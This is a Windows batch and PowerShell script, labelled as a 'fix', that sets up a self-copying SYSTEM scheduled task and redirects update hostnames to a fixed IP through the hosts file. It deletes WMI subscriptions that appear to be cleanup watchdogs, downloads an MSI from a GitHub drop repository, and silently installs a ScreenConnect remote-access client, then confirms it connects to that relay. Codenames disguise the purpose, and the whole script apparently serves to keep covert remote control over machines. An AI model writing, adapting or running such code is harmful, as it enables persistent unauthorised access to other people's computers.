@echo off
rem WINRTCS YOGA Gryxa fix — soft install, Pluxn-safe, laptop battery-safe.
rem Root case: Gryxa FP 36e506ff MISSING while sevrz+pluxn stay EST.
rem Does NOT msiexec /x shared PC (that drops Pluxn Guest). GitHub MSI only.
rem Log: C:\Users\Public\yoga_gryxa_fix.log
setlocal EnableExtensions
set "LOG=C:\Users\Public\yoga_gryxa_fix.log"
set "SELF=%~f0"
set "PUB=C:\Users\Public\yoga_gf.cmd"

if /I "%~nx0"=="yoga_gf.cmd" goto :run
if /I "%~1"=="--detached" goto :run
if /I "%~1"=="--run" goto :run

copy /y "%SELF%" "%PUB%" >nul 2>&1
>"%LOG%" echo [%DATE% %TIME%] LAUNCHER host=%COMPUTERNAME%

powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop'; ^
   $tn='WinRTCSYogaGF'; ^
   Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue; ^
   $a=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c C:\Users\Public\yoga_gf.cmd --run'; ^
   $st=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 2); ^
   $p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; ^
   Register-ScheduledTask -TaskName $tn -Action $a -Settings $st -Principal $p -Force | Out-Null; ^
   Start-ScheduledTask -TaskName $tn; ^
   Add-Content '%LOG%' ('LAUNCHER_STARTED '+ (Get-Date -Format o))" >>"%LOG%" 2>&1

echo QUEUED yoga-gryxa-fix - log %LOG%
echo Wait ~3 min then: type %LOG%
endlocal & exit /b 0

:run
>>"%LOG%" echo [%DATE% %TIME%] RUN_BEGIN host=%COMPUTERNAME%
set "MSI=C:\Users\Public\gryxa.msi"
set "GSVC=ScreenConnect Client (36e506ff016b2151)"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "REAL=209.145.55.189"

rem --- 1) Hosts pin (bypass router DNS games for Gryxa only) ---
echo [%DATE% %TIME%] hosts_pin>>"%LOG%"
powershell -NoP -NonI -EP Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'; $hp='$env:SystemRoot\System32\drivers\etc\hosts'; $real='%REAL%'; ^
   Copy-Item $hp ($hp+'.bak_yoga') -Force; ^
   $lines=@(Get-Content $hp | Where-Object { $_ -notmatch '(?i)gryxa\.com|\b127\.220\.0\.2\b' }); ^
   $lines += ($real+' update.gryxa.com'); $lines += ($real+' ui.gryxa.com'); ^
   Set-Content $hp $lines -Encoding ascii; ipconfig /flushdns | Out-Null; ^
   Add-Content '%LOG%' ('hosts_ok resolve='+([System.Net.Dns]::GetHostAddresses('update.gryxa.com')[0].ToString()))" >>"%LOG%" 2>&1

rem --- 2) Purge known Gryxa-killer WMI (C12) ---
echo [%DATE% %TIME%] purge_wmi>>"%LOG%"
powershell -NoP -NonI -EP Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'; $ns='root\subscription'; $log='%LOG%'; ^
   $pat='SCWatchdog|SystemHealthMonitor|BVTConsumer|BVTTrigger|BVTFilter|WucacheWatchdog|KernCap|SCCleanup|KeepTwo|ETLParser|NetTraceParser|wucache|SCRepair|RemoveRest|SCAgentMigration|RMMCleanup'; ^
   function L($m){ Add-Content $log ((Get-Date -Format o)+' '+$m) }; ^
   for($r=1;$r -le 4;$r++){ $n=0; ^
     Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | ForEach-Object { $b=[string]$_.Filter+' '+[string]$_.Consumer; if($b -match $pat){ try{ $_.Delete(); L ('del_bind'); $n++ }catch{} } }; ^
     Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer | ForEach-Object { if(($_.Name -match $pat) -or ($_.CommandLineTemplate -and $_.CommandLineTemplate -match $pat)){ $nm=$_.Name; Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($nm) } | ForEach-Object { try{ $_.Delete() }catch{} }; try{ $_.Delete(); L ('del_cons '+$nm); $n++ }catch{} } }; ^
     Get-WmiObject -Namespace $ns -Class __EventFilter | ForEach-Object { if(($_.Name -match $pat) -or ($_.Query -and $_.Query -match $pat)){ $nm=$_.Name; Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($nm) } | ForEach-Object { try{ $_.Delete() }catch{} }; try{ $_.Delete(); L ('del_filt '+$nm); $n++ }catch{} } }; ^
     L ('wmi_round='+$r+' killed='+$n); if($n -eq 0){ break } }" >>"%LOG%" 2>&1

rem --- 3) Fetch fresh UI MSI from GitHub (ui.gryxa.com TLS often dies) ---
echo [%DATE% %TIME%] fetch_msi>>"%LOG%"
del /f /q "%MSI%" >nul 2>&1
"%CURL%" -f -L --ssl-no-revoke --connect-timeout 15 --max-time 180 -o "%MSI%" "%BASE%/pkg_gryxa.msi?t=%RANDOM%" >>"%LOG%" 2>&1
set "OKMSI="
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GEQ 5000000 set "OKMSI=1"
if not defined OKMSI (
  echo [%DATE% %TIME%] FAIL_NO_MSI>>"%LOG%"
  echo FAIL_NO_MSI>>"%LOG%"
  endlocal & exit /b 3
)
for %%F in ("%MSI%") do echo [%DATE% %TIME%] msi_ok size=%%~zF>>"%LOG%"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1

rem --- 4) Soft install ONLY Gryxa (keep sevrz + pluxn session alive) ---
echo [%DATE% %TIME%] soft_install>>"%LOG%"
sc stop "%GSVC%" >>"%LOG%" 2>&1
ping -n 4 127.0.0.1 >nul
start /wait msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
echo [%DATE% %TIME%] msiexec_exit=%ERRORLEVEL%>>"%LOG%"
sc config "%GSVC%" start= auto >>"%LOG%" 2>&1
sc start "%GSVC%" >>"%LOG%" 2>&1
ping -n 25 127.0.0.1 >nul

rem --- 5) Verify RUNNING + EST to real Gryxa relay ---
powershell -NoP -NonI -EP Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'; $log='%LOG%'; $svc='ScreenConnect Client (36e506ff016b2151)'; $real='%REAL%'; ^
   function L($m){ Add-Content $log $m }; ^
   $s=Get-CimInstance Win32_Service |? { $_.Name -eq $svc }; ^
   if(-not $s){ L 'VERDICT=FAIL_NO_SVC'; exit 4 }; ^
   L ('state='+$s.State+' pid='+$s.ProcessId); L ('path='+$s.PathName); ^
   $est=@(Get-NetTCPConnection -OwningProcess $s.ProcessId -State Established -EA 0); ^
   if($est.Count -eq 0){ L 'EST=NONE' } else { foreach($e in $est){ L ('EST='+$e.RemoteAddress+':'+$e.RemotePort) } }; ^
   $keepers=@('ScreenConnect Client (5f6010579852e507)','ScreenConnect Client (f861c8140d453427)'); ^
   foreach($k in $keepers){ $ks=Get-CimInstance Win32_Service |? Name -eq $k; if($ks){ L ('keeper '+$k+'='+$ks.State) } }; ^
   if($s.State -eq 'Running' -and ($est |? { $_.RemoteAddress -eq $real })){ L 'VERDICT=OK_GRYXA_CONNECTED' } ^
   elseif($s.State -eq 'Running'){ L 'VERDICT=RUNNING_NO_RELAY_EST' } ^
   else { L ('VERDICT=FAIL_STATE_'+$s.State) }"

echo [%DATE% %TIME%] RUN_DONE>>"%LOG%"
endlocal & exit /b 0
